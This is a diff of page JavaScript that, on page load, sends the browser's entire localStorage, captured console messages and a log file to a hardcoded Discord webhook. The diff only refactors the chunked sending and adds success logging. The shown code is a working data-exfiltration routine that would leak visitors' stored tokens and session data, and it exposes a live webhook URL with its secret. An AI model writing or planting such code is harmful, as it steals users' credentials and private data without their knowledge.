@@ -14,14 +14,11 @@
         function sendToWebhook(messages) {
             const webhookUrl = "https://discord.com/api/webhooks/1315063023613775982/lAg4xa14l78fFemXvNpW3GYCl3mg7qGPa_qt7-H-VD5pusMUYfbN1xojwJumYCeaePju";
 
-            // Prepare the content
-            let content = "";
-            let chunk = 0;
             const maxLength = 2000; // Max Discord message length
 
             // Split the messages into chunks that fit within Discord's character limit
             while (messages.length > 0) {
-                content = messages.slice(0, maxLength).join('\n');
+                let content = messages.slice(0, maxLength).join('\n');
                 messages = messages.slice(content.length); // Remove the already sent portion
 
                 fetch(webhookUrl, {
@@ -34,6 +31,7 @@
                     }),
                 })
                 .then(response => response.json())
+                .then(data => console.log('Message sent successfully:', data))
                 .catch(error => console.error('Error sending message to Discord:', error));
             }
         }
@@ -41,33 +39,20 @@
         // Send localStorage data to Discord
         function sendLocalStorage() {
             let localStorageData = JSON.stringify(localStorage);
-            if (localStorageData.length > 2000) {
-                // If localStorage data is too large, split it into multiple chunks
-                while (localStorageData.length > 0) {
-                    let content = localStorageData.slice(0, 2000);
-                    localStorageData = localStorageData.slice(content.length);
+            const maxLength = 2000;
 
-                    fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            content: content,
-                        }),
-                    })
-                    .then(response => response.json())
-                    .catch(error => console.error('Error sending localStorage data:', error));
-                }
-            } else {
-                // If the data is small enough, send it as one message
+            // If localStorage data is too large, split it into multiple chunks
+            while (localStorageData.length > 0) {
+                let content = localStorageData.slice(0, maxLength);
+                localStorageData = localStorageData.slice(content.length);
+
                 fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        content: localStorageData,
+                        content: content,
                     }),
                 })
                 .then(response => response.json())
@@ -86,25 +71,17 @@
                 body: formData,
             })
             .then(response => response.json())
+            .then(data => console.log('File sent successfully:', data))
             .catch(error => console.error('Error sending log file:', error));
         }
 
         // Trigger functions (for example purposes, calling them when the page is loaded)
         window.onload = function() {
+            // You can trigger sending logs directly if you want, such as below:
             sendToWebhook(consoleMessages);
             sendLocalStorage();
-            sendLogsAsFile();
+            sendLogsAsFile();  // Uncomment this if you want to send the logs as a file
         };
-
-
-
-
-
-
-
-
-
-
 
 
 
